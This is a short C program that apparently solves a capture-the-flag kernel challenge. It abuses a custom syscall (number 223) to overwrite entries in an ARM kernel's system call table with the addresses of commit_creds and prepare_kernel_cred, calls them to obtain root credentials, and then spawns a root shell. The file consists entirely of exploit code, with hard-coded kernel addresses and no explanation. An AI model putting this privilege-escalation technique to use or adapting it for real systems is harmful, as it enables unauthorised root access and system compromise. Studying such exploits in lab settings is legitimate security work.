#include <stdio.h>
#include <stdlib.h>

#define SYS_UPPER 223

int main()
{
    unsigned int **system_call_table = (unsigned int**)0x8000e348;
    syscall(SYS_UPPER, "\x0e\xe0\xa0\xe1\x0e\xe0\xa0\xe1\x0e\xe0\xa0\xe1", 0x8003f560); // pading 12 byte
    syscall(SYS_UPPER, "\x60\xf5\x03\x80", &system_call_table[12]); // commit_cred
    syscall(SYS_UPPER, "\x24\xf9\x03\x80", &system_call_table[13]); // prepare_kernel_cred
    syscall(12, syscall(13, 0)); // commit_cred(prepare_kernel_cred(NULL))
    system("/bin/sh");
}